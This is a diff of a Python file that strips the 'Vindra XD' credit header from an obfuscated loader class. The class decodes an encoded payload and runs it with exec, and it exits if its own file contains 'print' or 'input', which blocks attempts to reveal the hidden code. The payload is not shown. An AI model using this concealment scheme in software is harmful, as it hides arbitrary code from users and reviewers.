@@ -1,9 +1,3 @@
-#────────────────────────────────────────────
-# encrypted By Vindra XD
-# Obsfuscate : VindraXD
-# github : https://github.com/Dra-ID/
-#────────────────────────────────────────────
-
 class VindraXD():
  def __init__(self:object,_byte:int=False,_exit:float=0,*_delete:int,**_system:str)->exec:
   self._exec,self._boom,self._encode,_system[_exit],_byte,self._bytes=lambda _bit:"".join(chr(int(_rasputin)-len(_bit.split('[')))if _rasputin!='*'else'ζ'for _rasputin in str(_bit).split('[')),lambda _eval:_byte(_eval),lambda _byte:str(_system[_exit](f"{self._bytes[4]+self._bytes[-13]+self._bytes[4]+self._bytes[2]}(''.join(%s),{self._bytes[6]+self._bytes[11]+self._bytes[14]+self._bytes[1]+self._bytes[0]+self._bytes[11]+self._bytes[18]}())"%list(_byte))).encode(self._bytes[20]+self._bytes[19]+self._bytes[5]+self._bytes[34])if _system[_exit]==eval else exit(),eval,lambda _byte:exit()if self._bytes[15]+self._bytes[17]+self._bytes[8]+self._bytes[13]+self._bytes[19] in open(__file__, errors=self._bytes[8]+self._bytes[6]+self._bytes[13]+self._bytes[14]+self._bytes[17]+self._bytes[4]).read() or self._bytes[8]+self._bytes[13]+self._bytes[15]+self._bytes[20]+self._bytes[19] in open(__file__, errors=self._bytes[8]+self._bytes[6]+self._bytes[13]+self._bytes[14]+self._bytes[17]+self._bytes[4]).read()else"".join(_byte if _byte not in self._bytes else self._bytes[self._bytes.index(_byte)+1 if self._bytes.index(_byte)+1<len(self._bytes)else 0]for _byte in "".join(chr(ord(t)-1)if t!="ζ"else"\n"for t in self._exec(_byte))),exit()if _byte else'abcdefghijklmnopqrstuvwxyz0123456789'
